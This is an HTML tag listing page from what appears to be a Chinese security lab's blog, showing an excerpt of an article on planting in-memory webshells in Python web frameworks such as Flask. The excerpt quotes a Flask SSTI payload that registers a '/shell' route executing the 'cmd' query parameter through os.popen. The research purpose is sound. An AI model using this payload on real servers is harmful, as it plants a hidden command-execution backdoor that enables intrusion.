@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="zh" dir="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>内存马 | 天工实验室</title>
+<meta name="keywords" content="">
+<meta name="description" content="奇安信天工实验室｜互联网基础设施漏洞挖掘">
+<meta name="author" content="奇安信天工实验室">
+<link rel="canonical" href="http://localhost:1313/tags/%E5%86%85%E5%AD%98%E9%A9%AC/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.9b0c42f9222bc665b5845e6199fc07fd87b025125d3366cc5f873b0f54ca8481.css" integrity="sha256-mwxC&#43;SIrxmW1hF5hmfwH/YewJRJdM2bMX4c7D1TKhIE=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" type="application/rss+xml" href="http://localhost:1313/tags/%E5%86%85%E5%AD%98%E9%A9%AC/index.xml">
+<link rel="alternate" hreflang="zh" href="http://localhost:1313/tags/%E5%86%85%E5%AD%98%E9%A9%AC/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript>
+</head>
+
+<body class="list dark" id="top">
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="天工实验室 (Alt + H)">
+                <img src="http://localhost:1313/logo/logo3.png" alt="" aria-label="logo"
+                    height="100" style="margin-top: 15px;">
+            </a>
+            <div class="logo-switches">
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/archives" title="归档">
+                    <span>归档</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/tags/" title="标签">
+                    <span>标签</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://poc.qianxin.com/home" title="破壳官网">
+                    <span>破壳官网</span>&nbsp;
+                    <svg fill="none" shape-rendering="geometricPrecision" stroke="currentColor" stroke-linecap="round"
+                        stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12">
+                        <path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"></path>
+                        <path d="M15 3h6v6"></path>
+                        <path d="M10 14L21 3"></path>
+                    </svg>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main"> 
+<header class="page-header"><div class="breadcrumbs"><a href="http://localhost:1313/">主页</a>&nbsp;»&nbsp;<a href="http://localhost:1313/tags/">标签</a></div>
+  <h1>
+    内存马
+    <a href="/tags/%E5%86%85%E5%AD%98%E9%A9%AC/index.xml" title="RSS" aria-label="RSS">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+        stroke-linecap="round" stroke-linejoin="round" height="23">
+        <path d="M4 11a9 9 0 0 1 9 9" />
+        <path d="M4 4a16 16 0 0 1 16 16" />
+        <circle cx="5" cy="19" r="1" />
+      </svg>
+    </a>
+  </h1>
+</header>
+
+<article class="post-entry tag-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">Python Web 内存马多框架植入技术详解
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>Python Web 内存马多框架植入技术详解 一、前言 内存马作为一种常见的攻击与权限维持手段，往往多见于Java Web应用中，然而在Python Web场景下却并不多见这种攻击。
+本文将针对Flask、Tornado与Django三个在日常开发中使用频率较高的框架，探寻在Python Web场景下的内存马种植方法，文中所有场景均为抽象出的理想场景，仅做可行性讨论。
+二、Flask 2.1 老版本Flask内存马种植方法 在网上针对Flask内存马的探讨，均在SSTI场景下，并且payload都相同，格式化后payload如下：
+url_for.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;]( &#34;app.add_url_rule( &#39;/shell&#39;, &#39;shell&#39;, lambda :__import__(&#39;os&#39;).popen(_request_ctx_stack.top.request.args.get(&#39;cmd&#39;, &#39;whoami&#39;)).read() )&#34;, { &#39;_request_ctx_stack&#39;:url_for.__globals__[&#39;_request_ctx_stack&#39;], &#39;app&#39;:url_for.__globals__[&#39;current_app&#39;] } ) 在Flask中所有定义的路由都会使用一个装饰器 app.route，而这个装饰器就是调用了 add_url_rule。
+@setupmethod def route(self, rule: str, **options: t.Any) -&gt; t.Callable[[T_route], T_route]: def decorator(f: T_route) -&gt; T_route: endpoint = options.pop(&#34;endpoint&#34;, None) self.add_url_rule(rule, endpoint, f, **options) return f return decorator 所以在payload中，直接调用了Flask中的 add_url_rule 函数来动态增加一条路由实现内存马。然而在最新版本的Flask中，如果直接使用这个payload会发现将抛出一个异常。
+2.2 AssertionError出现原因 在回溯这个异常的时候会发现，这个异常出现在 setupmethod 这个装饰器中的一个校验函数。
+def _check_setup_finished(self, f_name: str) -&gt; None: if self....</p>
+  </div>
+  <footer class="entry-footer"><span title='2024-07-10 00:00:00 +0000 UTC'>2024年07月10日</span>&nbsp;·&nbsp;5 分钟&nbsp;·&nbsp;4uuu Nya</footer>
+  <a class="entry-link" aria-label="post link to Python Web 内存马多框架植入技术详解" href="http://localhost:1313/blog/tiangongarticle038/"></a>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>© <a href="https://poc.qianxin.com/home">天工实验室</a></span>
+        
+
+    
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+</body>
+
+</html>
